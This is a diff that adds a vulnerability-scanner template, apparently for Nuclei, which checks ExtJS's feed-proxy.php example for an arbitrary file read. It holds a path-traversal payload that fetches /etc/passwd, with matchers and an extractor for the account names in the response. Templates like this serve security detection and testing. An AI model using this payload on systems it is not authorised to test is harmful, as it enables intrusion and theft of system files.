@@ -1,0 +1,34 @@
+id: extjs-arbitrary-file-read
+info:
+  name: ExtJS Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The ExtJS framework is vulnerable to an arbitrary file read vulnerability, allowing attackers to access sensitive files on the server.
+  tags: file-read
+
+variables:
+  v_feed:
+    - "http/../feed-viewer.css"
+    - "http/../../../../../../../../../../../etc/passwd"
+
+http:
+  - method: GET
+    path:
+      - "/extjs/examples/feed-viewer/feed-proxy.php?feed={{v_feed}}"
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: regex
+        part: body
+        regex:
+          - "\\.ext-el-mask"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "root:(.*?):"
